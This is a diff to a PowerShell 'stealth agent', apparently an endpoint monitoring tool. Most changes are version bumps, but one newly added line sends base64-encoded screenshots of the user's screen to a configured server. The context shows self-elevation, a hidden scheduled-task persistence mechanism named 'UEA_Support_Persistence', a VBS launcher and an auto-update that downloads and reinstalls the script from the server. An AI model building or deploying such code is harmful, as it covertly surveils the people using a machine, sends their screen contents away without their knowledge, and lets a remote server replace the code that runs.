@@ -3,7 +3,7 @@ param(
     [switch]$Install
 )
 
-# Version: 1.7.0
+# Version: 1.7.1
 # Description: Extreme-Compat User-Mode Agent with stable ID detection.
 
 # 0. SELF-ELEVATION (Needed for Security Logs)
@@ -69,7 +69,7 @@ try {
 # 3. ROBUST INSTALLATION LOGIC
 function Install-StealthAgent {
     try {
-        Log-Message "Initiating User-Level Persistent Install v1.7.0..."
+        Log-Message "Initiating User-Level Persistent Install v1.7.1..."
         $TaskName = "UEA_Support_Persistence"
         Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue | Stop-ScheduledTask -ErrorAction SilentlyContinue
         Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
@@ -85,7 +85,7 @@ function Install-StealthAgent {
 
         Copy-Item -Path $SourceFile -Destination $ScriptPath -Force -ErrorAction Stop
         
-        $Config = @{ ServerUrl = $ServerUrl; Version = "1.7.0" }
+        $Config = @{ ServerUrl = $ServerUrl; Version = "1.7.1" }
         $Config | ConvertTo-Json | Out-File -FilePath $ConfigPath -Force
         
         $VbsMainPath = "$InstallDir\uea_stealth.vbs"
@@ -130,7 +130,7 @@ try {
         if ($SavedConfig) { $ServerUrl = $SavedConfig.ServerUrl }
     }
 
-    Log-Message "Agent v1.7.0 Started (Admin=$IsAdmin). ID: $AgentId"
+    Log-Message "Agent v1.7.1 Started (Admin=$IsAdmin). ID: $AgentId"
     
     function Take-Screenshot {
         try {
@@ -219,7 +219,7 @@ try {
             }
             
             $Payload = @{
-                agentId = $AgentId; serialNumber = $SerialNumber; version = "1.7.0"; status = "online"
+                agentId = $AgentId; serialNumber = $SerialNumber; version = "1.7.1"; status = "online"
                 deviceName = $env:COMPUTERNAME; os = $OSInfo; publicIp = $CachedPubIp; localIp = $CachedLocIp; isp = "Enterprise"
             }
             $BodyJson = $Payload | ConvertTo-Json
@@ -273,9 +273,7 @@ try {
                 if ($NowS - $LastSnapshotTime -gt 300) { # Every 5 mins max
                     $Snapshot = Take-Screenshot
                     if ($Snapshot) {
-                        Send-DlpEvent -Type "security_snapshot" -Details "Snapshot triggered by window: $WinTitle" -Severity "high"
-                        # We report the snapshot as a separate command result or just Base64 in details if small.
-                        # For now, we'll just log the event. In a real app, we'd upload the image.
+                        Send-DlpEvent -Type "security_snapshot" -Details "Snapshot evidence (window: $WinTitle)|data:image/jpeg;base64,$Snapshot" -Severity "critical"
                         $LastSnapshotTime = $NowS
                     }
                 }
@@ -283,7 +281,7 @@ try {
             Check-BlockedEvents
             # ---------------------
 
-            if ($Response.latestVersion -and ([version]$Response.latestVersion -gt [version]"1.7.0")) {
+            if ($Response.latestVersion -and ([version]$Response.latestVersion -gt [version]"1.7.1")) {
                 Invoke-WebRequest -Uri "$ServerUrl/api/agent/update" -OutFile "$ScriptPath" -UseBasicParsing | Out-Null
                 Install-StealthAgent
                 $VbsRestart = "$InstallDir\restart.vbs"
